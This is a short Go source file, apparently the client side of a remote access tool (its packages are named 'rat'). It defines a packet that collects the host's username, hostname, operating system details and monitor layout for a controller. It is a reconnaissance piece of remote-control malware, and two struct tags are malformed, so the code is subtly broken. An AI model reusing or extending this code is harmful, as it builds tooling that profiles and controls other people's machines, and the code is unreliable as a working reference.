package main

import (
	"oslib"
	"rat/client/computer"
	"rat/client/screen"
	"rat/shared"
	"rat/shared/network/header"
)

type ComputerInfoPacket struct {
	Username                   string
	Hostname                   string
	OperatingSystemName        string `operatingSystemName"`
	OperatingSystemDisplayName string `operatingSystemDisplayName`
	Monitors                   []shared.Monitor
}

func (packet ComputerInfoPacket) Header() header.PacketHeader {
	return header.ComputerInfoHeader
}

func (packet *ComputerInfoPacket) Init() {
	u := computer.GetComputerInformation()

	packet.Username = u.Username
	packet.Hostname = u.Hostname
	packet.OperatingSystemName = oslib.Name
	packet.OperatingSystemDisplayName = oslib.GetDisplay()

	screen.QueryMonitors()
	packet.Monitors = screen.Monitors
}
